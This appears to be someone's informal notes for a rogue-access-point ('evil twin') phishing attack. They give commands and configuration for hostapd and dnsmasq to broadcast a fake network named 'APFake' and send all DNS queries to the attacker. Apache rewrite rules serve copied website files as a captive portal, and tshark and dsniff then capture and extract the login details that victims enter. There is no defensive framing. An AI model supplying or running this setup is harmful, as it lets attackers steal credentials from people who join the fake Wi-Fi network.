rmmod r8188eu.ko
modprobe 8188eu

Job for apache2.service failed because the control process exited with error code.
See "systemctl status apache2.service" and "journalctl -xeu apache2.service" for details.

SOLOVED:
run: sudo a2enmod rewrite && sudo service apache2 restart


--------------------------------------------------------------


Set up an Access Point Using Hostapd:

- sudo apt install dnsmasq hostapd
- sudo airmon-ng check kill

Edit dnsmasq.conf file: 

#Set the wireless interface
interface=wlan1
#Set the IP range for the clients
dhcp-range=192.168.1.2,192.168.1.250,12h
#Set the getway IP address
dhcp-option=3,192.168.1.1
#Set DNS server address
dhcp-option=6,192.168.1.1
#Redirect all requests to 192.168.1.1
address=/#/192.168.1.1

Edit hostapd.conf file:

#Set wireless interface
interface=wlan1
#Set driver
driver=nl80211
#Set network name
ssid=APFake
#Set channel
channel=1

- sudo dnsmasq -C dnsmasq.conf
- sudo hostapd hostapd.conf -B

SETTING UP A CAPTIVE PORTAL:

- sudo ifconfig wlan1 192.168.1.1/24

COPY THE WEBSITE FILES TO VAR/WWW/HTML

ADD SOME LINES TO 000-default.conf:

<Directory "/var/www/html">
RewriteEngine On
RewriteBase /
RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]
RewriteRule ^(.*)$ http://%1/%1 [R=301,L]

RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ / [L,QSA]
</Directory>


- sudo service apache2 start

SNIFF LOGIN INFOMARTION FROM CAPTIVE PORTAL:

- tshark -i wlan0 -w captureAP

TO SEE THE INFOMARTION:

- dsniff -p captureAP

